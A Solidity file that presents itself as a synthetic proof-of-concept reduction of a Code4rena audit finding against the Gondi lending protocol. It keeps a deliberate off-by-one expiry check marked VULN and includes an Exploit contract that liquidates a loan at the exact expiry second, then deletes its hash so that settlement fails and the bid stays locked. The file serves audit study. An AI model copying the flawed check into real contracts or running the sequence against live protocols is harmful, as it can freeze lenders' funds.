// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Gondi — _baseLoanChecks treats the exact expiry second as still live
    (Code4rena 2024-04, H-15, #35217).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: the loan check uses `< block.timestamp` and liquidation uses `> block.timestamp`.
    When startTime + duration == block.timestamp, both succeed. Liquidation opens an auction
    and leaves the loan hash in place. addNewTranche then deletes that hash. Settlement reverts
    and the bid stays in the auction.
    The blamed comparison is preserved verbatim below (@> VULN).

    Repo: code-423n4/2024-04-gondi @ b9863d73c08fcdd2337dc80a8b5e0917e18b036c
    MultiSourceLoan._baseLoanChecks and LoanLiquidator expiration check. */

library Terms {
    uint256 internal constant BID = 1000 ether;
    uint256 internal constant START = 0;
    uint256 internal constant DURATION = 1;
    uint256 internal constant LOAN_ID = 1;
    uint256 internal constant TOKEN_ID = 42;
    address internal constant BORROWER = 0x000000000000000000000000000000000000B0Bb;
    address internal constant LENDER = 0x000000000000000000000000000000000000B0B5;
}

contract PrincipalToken {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mintAndApprove(address holder, address spender, uint256 amount) external {
        balanceOf[holder] += amount;
        totalSupply += amount;
        allowance[holder][spender] = amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Auction {
    PrincipalToken public immutable token;
    uint256 public loanId;
    uint256 public bid;
    bool public opened;

    constructor(PrincipalToken _token) {
        token = _token;
    }

    function open(uint256 id, uint256 amount) external {
        opened = true;
        loanId = id;
        bid = amount;
    }

    function pay(address to) external {
        token.transfer(to, bid);
        bid = 0;
    }
}

contract MultiSourceLoan {
    struct Loan {
        uint256 id;
        address borrower;
        uint256 startTime;
        uint256 duration;
        uint256 tokenId;
    }

    PrincipalToken public immutable token;
    Auction public immutable auction;
    mapping(uint256 => bytes32) public loanHash;
    bool public mutated;

    constructor(PrincipalToken _token, Auction _auction) {
        token = _token;
        auction = _auction;
    }

    function hashLoan(Loan memory loan) public pure returns (bytes32) {
        return keccak256(abi.encode(loan.id, loan.borrower, loan.startTime, loan.duration, loan.tokenId));
    }

    function seed(Loan memory loan) external {
        require(loanHash[loan.id] == bytes32(0), "seeded");
        loanHash[loan.id] = hashLoan(loan);
    }

    /// Liquidation accepts the loan once expirationTime is not strictly after now.
    function liquidate(Loan calldata loan) external {
        require(loanHash[loan.id] == hashLoan(loan), "loan");
        uint256 expirationTime = loan.startTime + loan.duration;
        if (expirationTime > block.timestamp) {
            revert("not due");
        }
        token.transferFrom(msg.sender, address(auction), Terms.BID);
        auction.open(loan.id, Terms.BID);
    }

    function _baseLoanChecks(uint256 loanId, Loan memory loan) private view {
        require(loanHash[loanId] == hashLoan(loan), "loan");
        // @> VULN: strict < treats the exact expiry second as still live. Liquidation uses >.
        if (loan.startTime + loan.duration < block.timestamp) {
            revert("expired");
        }
    }

    function addNewTranche(Loan memory loan) external {
        _baseLoanChecks(loan.id, loan);
        // Memory assignment is a reference. Build a new struct so loan.id stays 1.
        Loan memory nextLoan = Loan({
            id: loan.id + 1,
            borrower: loan.borrower,
            startTime: loan.startTime,
            duration: loan.duration,
            tokenId: loan.tokenId
        });
        loanHash[nextLoan.id] = hashLoan(nextLoan);
        delete loanHash[loan.id];
        mutated = true;
    }

    function settle(uint256 loanId) external {
        require(loanHash[loanId] != bytes32(0), "cleared");
        auction.pay(Terms.LENDER);
        delete loanHash[loanId];
    }
}

contract Exploit {
    PrincipalToken public token; // CREATE nonce 1
    Auction public auction; // CREATE nonce 2
    MultiSourceLoan public loan; // CREATE nonce 3
    bool public settleFailed;

    constructor() {
        token = new PrincipalToken();
        auction = new Auction(token);
        loan = new MultiSourceLoan(token, auction);
    }

    function sampleLoan() public pure returns (MultiSourceLoan.Loan memory loanState) {
        loanState = MultiSourceLoan.Loan({
            id: Terms.LOAN_ID,
            borrower: Terms.BORROWER,
            startTime: Terms.START,
            duration: Terms.DURATION,
            tokenId: Terms.TOKEN_ID
        });
    }

    function run() external {
        require(block.timestamp == 1, "clock");
        MultiSourceLoan.Loan memory openLoan = sampleLoan();
        require(openLoan.startTime + openLoan.duration == block.timestamp, "exact expiry");
        loan.seed(openLoan);
        token.mintAndApprove(address(this), address(loan), Terms.BID);

        loan.liquidate(openLoan);
        require(token.balanceOf(address(auction)) == Terms.BID, "bid");
        require(loan.loanHash(Terms.LOAN_ID) != bytes32(0), "hash live");

        loan.addNewTranche(openLoan);

        (bool ok,) = address(loan).call(abi.encodeCall(MultiSourceLoan.settle, (Terms.LOAN_ID)));
        require(!ok, "settle");
        settleFailed = true;
        require(loan.mutated(), "mutated");
        require(loan.loanHash(Terms.LOAN_ID) == bytes32(0), "cleared");
        require(loan.loanHash(Terms.LOAN_ID + 1) != bytes32(0), "replacement");
        require(token.balanceOf(address(auction)) == Terms.BID, "locked");
        require(token.balanceOf(Terms.LENDER) == 0, "lender unpaid");
    }
}
